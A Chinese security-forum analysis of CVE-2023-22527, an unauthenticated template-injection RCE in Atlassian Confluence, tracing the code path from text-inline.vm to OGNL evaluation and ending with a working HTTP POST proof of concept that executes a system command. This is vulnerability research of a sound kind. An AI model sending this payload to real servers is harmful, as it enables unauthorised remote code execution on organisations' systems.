<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.butian.net](https://forum.butian.net/share/2741)

> 奇安信攻防社区 - Atlassian Confluence 模板注入代码执行漏洞（CVE-2023-22527）

作者：Le1a@threatbook  
校验：jweny@threatbook

Atlassian Confluence 是一款由 Atlassian 开发的企业团队协作和知识管理软件，提供了一个集中化的平台，用于创建、组织和共享团队的文档、知识库、项目计划和协作内容。

攻击者可在无需登录的情况下，利用该漏洞构造恶意请求，导致远程代码执行。

*   8.5.0 ≤ version ≤ 8.5.3
*   8.0.x，8.1.x，8.2.x，8.3.x，8.4.x

在 Confluence 中，.vm 文件是使用 Velocity 模板语言创建的模板文件。Velocity 是一个基于 Java 的模板引擎，它允许你使用简单的标记语言来引用 Java 对象和方法，从而动态生成 HTML、XML 或任何文本格式的内容。

处理. vm 文件的主要类是 ConfluenceVelocityServlet。这个 Servlet 负责接收和处理来自浏览器的请求，加载和解析. vm 模板，执行其中的 Velocity 代码，然后将生成的 HTML 发送回浏览器。

这次的漏洞点位于：/template/aui/text-inline.vm 文件，可以直接通过 / template/aui/text-inline.vm 访问

```
#set( $labelValue = $stack.findValue("getText('$parameters.label')") )
#if( !$labelValue )
    #set( $labelValue = $parameters.label )
#end

#if (!$parameters.id)
    #set( $parameters.id = $parameters.name)
#end

<label id="${parameters.id}-label" for="$parameters.id">
$!labelValue
#if($parameters.required)
    <span></span>
    <span>$parameters.required</span>
#end
</label>

#parse("/template/aui/text-include.vm")


```

`$stack.findValue("getText('$parameters.label')")`意味着从请求中获取的 label 参数的值传入了`$stack.findValue`，由此可以判断这里存在模版注入

.vm 文件由`ConfluenceVelocityServlet`处理

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-6dd398b993fb7f0994f4734f2d2f2c1e15d8a56e.png)

继续跟进

```
protected void doRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    try {
        
        Context context = this.createContext(request, response);
        
        this.setContentType(request, response);
        
        Template template = this.handleRequest(request, response, context);
        
        if (template == null) {
            return;
        }
        
        this.mergeTemplate(template, context, response);
    }
    
}


```

这里跟进`handleRequest()`，可以发现从 URI 中获取 vm 文件路径，传入`getTemplate()`来返回模版对象

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-0337205fcd9a8e616d3445209c7f7bc3d1290dd0.png)

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-f3abafc1802c5e1468fdb9756b91328124592cca.png)

然后传入`mergeTemplate()`函数处理

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-127a38e6f485c441bfba2747877c3336180c312a.png)

```
protected void mergeTemplate(Template template, Context context, HttpServletResponse response) throws ResourceNotFoundException, ParseErrorException, MethodInvocationException, IOException, UnsupportedEncodingException, Exception {
    
    PageContext oldPageContext = ServletActionContext.getPageContext();
    
    JspFactory jspFactory = JspFactory.getDefaultFactory();
    
    HttpServletRequest request = (HttpServletRequest)context.get("request");
    
    PageContext pageContext = jspFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
    
    ActionContext actionContext = ActionContext.getContext();
    
    actionContext.put("com.opensymphony.xwork2.dispatcher.PageContext", pageContext);
    Writer writer = null;
    try {
        
        writer = pageContext.getOut();
        
        template.merge(context, writer);
    }
    
    }


```

这里创建新的 PageContext，获取其输出流，准备进行模板合并和输出操作。

继续跟进`template.merge()`

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-241a49d9ff74eb016da25ec80d9fb1cff148473d.png)

跟进到 merge 的重载函数

```
public void merge(Context context, Writer writer, List macroLibraries) throws ResourceNotFoundException, ParseErrorException, MethodInvocationException, IOException {
        if (this.errorCondition != null) {
            throw this.errorCondition;
        } else if (this.data == null) {
            String msg = "Template.merge() failure. The document is null, most likely due to parsing error.";
            throw new RuntimeException(msg);
        } else {
            InternalContextAdapterImpl ica = new InternalContextAdapterImpl(context);
            ica.setMacroLibraries(macroLibraries);
            if (macroLibraries != null) {
                for(int i = 0; i < macroLibraries.size(); ++i) {
                    try {
                        this.rsvc.getTemplate((String)macroLibraries.get(i));
                    } catch (ResourceNotFoundException var13) {
                        this.rsvc.getLog().error("template.merge(): cannot find template " + (String)macroLibraries.get(i));
                        throw var13;
                        } catch (ParseErrorException var14) {
                        this.rsvc.getLog().error("template.merge(): syntax error in template " + (String)macroLibraries.get(i) + ".");
                        throw var14;
                    } catch (Exception var15) {
                        throw new RuntimeException("Template.merge(): parse failed in template  " + (String)macroLibraries.get(i) + ".", var15);
                    }
                }
            }

            try {
                ica.pushCurrentTemplateName(this.name);
                ica.setCurrentResource(this);
                ((SimpleNode)this.data).render(ica, writer);
            } finally {
                ica.popCurrentTemplateName();
                ica.setCurrentResource((Resource)null);
            }

        }
    }


```

由于传入的 macroLibraries 为空，所以直接执行 try 逻辑

1.  调用 `ica.pushCurrentTemplateName(this.name);` 将当前模板的名称压入到 `ica` 的模板名堆栈中。这是为了在嵌套模板的情况下能够追踪到当前正在处理的模板名称。
2.  调用 `ica.setCurrentResource(this);` 将当前模板对象设置为 `ica` 的当前资源。这是为了让 `ica` 知道当前正在处理的模板资源。
3.  最后，通过调用 `((SimpleNode)this.data).render(ica, writer);` 进行模板渲染

省略中间的部分渲染过程，跟进到`ASTReference#execute()`

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-55774aecb27ef746335e02525f880eda039c1ed4.png)

这里从上下文中获取 OgnlValueStack，继续跟进

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-3d219511e9b2142421073e1a621c6f30503009bb.png)

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-c66637ec1f5204d61002051d00c499cef1f4f533.png)

这里从请求中获取到参数，然后通过`Object obj = method.invoke(o, params);`执行，继续跟进

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-61876968d1e555c15d1307f5af01743960d99e18.png)

经过几层 invoke 调用后，来到了最终 vm 文件模版的位置——`OgnlValueStack.findValue()`

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-4632745c74d140bacc741e66880e50525d8cce14.png)

随后，传给 label 参数的 OGNL 表达式语句被执行

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-4760c70ef357dce8052ebc7bfc17c8a56f8cadff.png)

由这篇文章可得知：[https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context](https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context)

对于 Velocity 模版引擎，可以使用如下方法：

*   `.KEY_velocity.struts2.context` -> (`StrutsVelocityContext`)
    *   `ognl` (`org.apache.struts2.views.jsp.ui.OgnlTool`)
    *   `struts` (`org.apache.struts2.views.velocity.result.VelocityStrutsUtils`)

org.apache.struts2.views.jsp.ui.OgnlTool 类在没有 OgnlContext 的情况下调用了 Ognl.getValue()。需要注意的是，该类属于 OGNL 库，而不是 Struts 的一部分。因此，这个 "findValue" 调用在 Struts 的沙箱限制之外运行。

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-c0387cf297967510f9cbb5a8e98dfebfe6ffee87.png)

1.  网站首页如下图：

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-0e5afe5c961024822eab9395419af637b82f0071.png)

2.  使用如下 POC 进行漏洞复现

```
POST /template/aui/text-inline.vm HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded

label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache. struts2.ServletActionContext@getResponse().setHeader('Cmd-Responses-Header',(new freemarker.template.utility.Execute()).exec({"id"}))


```

![](https://shs3.b.qianxin.com/attack_forum/2024/01/attach-f82e4dbf18d18838be45b28ae066469339128414.png)